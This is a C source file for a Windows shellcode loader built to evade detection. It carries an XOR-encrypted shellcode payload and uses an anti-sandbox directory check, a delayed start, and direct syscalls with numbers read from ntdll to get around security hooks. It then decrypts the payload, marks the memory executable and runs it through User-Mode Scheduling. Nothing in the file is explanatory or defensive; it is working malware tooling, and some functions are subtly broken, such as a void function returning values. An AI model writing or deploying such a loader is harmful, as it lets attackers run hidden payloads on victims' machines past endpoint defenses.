#include <windows.h>
#include <winternl.h>
#include <stdio.h>


static unsigned char sc[] = "\x94\x27\xed\x81\x83\x9c\xa8\x6f\x6e\x65\x32\x25\x29\x3f\x3c\x34\x25\x3c\x59\xbd\x0b\x2d\xf8\x26\x08\x27\xe5\x37\x6b\x3c\xe3\x3d\x4e\x2d\xf8\x06\x38\x27\x61\xd2\x39\x3e\x25\x5e\xa7\x2d\x42\xb4\xc4\x53\x0f\x19\x71\x58\x48\x2e\xaf\xac\x7e\x35\x69\xae\x8c\x88\x21\x35\x39\x27\xe5\x37\x53\xff\x2a\x53\x26\x64\xa3\xff\xe8\xe7\x6e\x65\x73\x3c\xed\xaf\x1a\x02\x3b\x75\xb8\x3f\xe5\x2d\x6b\x30\xe3\x2f\x4e\x2c\x72\xa4\x8b\x39\x26\x9a\xba\x35\xe3\x5b\xe6\x2d\x72\xa2\x25\x5e\xa7\x2d\x42\xb4\xc4\x2e\xaf\xac\x7e\x35\x69\xae\x56\x85\x06\x85\x24\x6c\x22\x41\x7b\x31\x51\xbe\x1b\xbd\x2b\x30\xe3\x2f\x4a\x2c\x72\xa4\x0e\x2e\xe5\x69\x3b\x30\xe3\x2f\x72\x2c\x72\xa4\x29\xe4\x6a\xed\x3b\x75\xb8\x2e\x36\x24\x2b\x2a\x31\x35\x2f\x3d\x32\x2d\x29\x35\x26\xe6\x9f\x54\x29\x3d\x91\x85\x2b\x35\x31\x35\x26\xee\x61\x9d\x3f\x90\x91\x9a\x2e\x3c\xd2\x6e\x6e\x65\x73\x74\x68\x6f\x6e\x2d\xfe\xf9\x69\x6e\x6e\x65\x32\xce\x59\xe4\x01\xe2\x8c\xa1\xd3\x9f\xdb\xc7\x25\x35\xd2\xc9\xfb\xd8\xee\x8b\xbd\x27\xed\xa1\x5b\x48\x6e\x13\x64\xe5\x88\x94\x1d\x6a\xd5\x22\x60\x06\x07\x05\x6e\x3c\x32\xfd\xb2\x90\xbb\x06\x12\x18\x0b\x41\x0b\x1d\x16\x74";

DWORD g_NtAllocateVirtualMemorySyscall = 0;
DWORD g_NtProtectVirtualMemorySyscall = 0;


void xor_decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    } 
}

void dircheck(const wchar_t* targetDir) {
    wchar_t exePath[MAX_PATH];
    wchar_t exeDir[MAX_PATH];

    // Get full path to current executable
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
        return FALSE;

    // Copy path so we can modify it
    wcscpy_s(exeDir, MAX_PATH, exePath);

    // Strip filename → exeDir = "...\\parent"
    wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
    if (!lastSlash)
        return FALSE;
    *lastSlash = L'\0';

    // Find start of parent directory name
    wchar_t* parentSlash = wcsrchr(exeDir, L'\\');
    if (!parentSlash)
        return FALSE;

    // Compare only the directory name
    BOOL b = _wcsicmp(parentSlash + 1, targetDir) == 0;

    if (b == 0) {
        exit(-1);
    }
}

void WINAPI UmsSchedulerProc(
    UMS_SCHEDULER_REASON reason,
    ULONG_PTR activationPayload,
    PVOID schedulerParam
) {
    if (reason == UmsSchedulerThreadYield) {
        // Shellcode yielded or exited
        ExitThread(0);
    }
}

void RunShellcodeUMS(void* shellcode) {
    PUMS_COMPLETION_LIST cl = NULL;
    PUMS_CONTEXT ctx = NULL;

    CreateUmsCompletionList(&cl);

    CreateUmsThreadContext(&ctx);

    // Set shellcode as the UMS thread start
    UmsThreadYield(ctx); // initializes context

    // Manually patch RIP (documented trick)
    CONTEXT c = { 0 };
    c.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(GetCurrentThread(), &c);
    c.Rip = (DWORD64)shellcode;
    SetThreadContext(GetCurrentThread(), &c);

    UMS_SCHEDULER_STARTUP_INFO si = { 0 };
    si.UmsVersion = UMS_VERSION;
    si.CompletionList = cl;
    si.SchedulerProc = UmsSchedulerProc;

    EnterUmsSchedulingMode(&si);
}


DWORD GetSyscallFromDiskClassic(const char* name){
    HMODULE cleanNtDll = LoadLibraryExA(
        "ntdll.dll",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!cleanNtDll)
        return 0;

    BYTE* fn = (BYTE*)GetProcAddress(cleanNtDll, name);
    if (!fn)
        return 0;

    // Expected:
    // 4C 8B D1          mov r10, rcx
    // B8 xx xx xx xx    mov eax, syscall#
    DWORD syscall = *(DWORD*)(fn + 4);

    FreeLibrary(cleanNtDll);
    return syscall;
}

DWORD ExtractSyscallNumber(BYTE* fn) {
    BYTE* p = fn;
    // Follow jump stubs
    for (int depth = 0; depth < 5; depth++) {
        // jmp rel32
        if (p[0] == 0xE9) {
            INT32 rel = *(INT32*)(p + 1);
            p = p + 5 + rel;
            continue;
        }
        // jmp qword ptr [rip+imm32]
        if (p[0] == 0xFF && p[1] == 0x25) {
            INT32 rel = *(INT32*)(p + 2);
            BYTE** target = (BYTE**)(p + 6 + rel);
            p = *target;
            continue;
        }
        break;
    }
    // Now scan for mov eax, imm32
    for (int i = 0; i < 0x40; i++) {
        if (p[i] == 0xB8) {
            return *(DWORD*)(p + i + 1);
        }
    }
    return 0;
}

DWORD GetSyscallFromDisk(const char* name) {
    HMODULE cleanNtDll = LoadLibraryExA(
        "ntdll.dll",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!cleanNtDll)
        return 0;

    BYTE* fn = (BYTE*)GetProcAddress(cleanNtDll, name);
    if (!fn)
        return 0;

    DWORD syscall = ExtractSyscallNumber(fn);

    FreeLibrary(cleanNtDll);
    return syscall;
}

void InitSyscalls(){
    g_NtAllocateVirtualMemorySyscall = GetSyscallFromDiskClassic("NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory: %d", g_NtAllocateVirtualMemorySyscall);
    g_NtProtectVirtualMemorySyscall = GetSyscallFromDiskClassic("NtProtectVirtualMemory");
    printf("NtProtectVirtualMemory: %d", g_NtProtectVirtualMemorySyscall);
}

extern NTSTATUS NtAllocateVirtualMemory_syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern NTSTATUS NtProtectVirtualMemory_syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

void* h_ntallocatevirtualmemory(SIZE_T size, ULONG protect){
    PVOID base = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = NtAllocateVirtualMemory_syscall(
        GetCurrentProcess(),
        &base,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        protect
    );

    if (status != 0)
        return NULL;

    return base;
}

void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG oldprotect) {

    NTSTATUS status = NtProtectVirtualMemory_syscall(
        GetCurrentProcess(),
        (PVOID*)&buf,
        &size,
        newprotect,
        oldprotect
    );
}

int main(void){
    dircheck(L"build");
    Sleep(8000);
    InitSyscalls();
    SIZE_T sc_size = sizeof(sc) - 1;
    char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
    printf("buf=%p\n", buf);
    if (!buf) {
        return -1;
    }

    /*strcpy_s(buf, 0x1000, "Hello from syscall-backed allocator");
    puts(buf);
    fflush(stdout);*/

    memcpy(buf, sc, sc_size);
    //decrypt shellcode
    static unsigned char key[] = "honest";
    SIZE_T key_len = sizeof(key) - 1;  // drop '\0'
    xor_decrypt((unsigned char*)buf, sc_size, key, key_len);
   
    ULONG oldprotect;
    h_ntprotectvirtualmemory(buf, sc_size, PAGE_EXECUTE_READ, &oldprotect); 
    MessageBoxA(NULL, "perms changed", "Debug", MB_OK);


    // this is how you execute it 
   /* void (*entry)() = (void (*)())buf;
    entry();*/

	RunShellcodeUMS(buf);

    return 0;
}
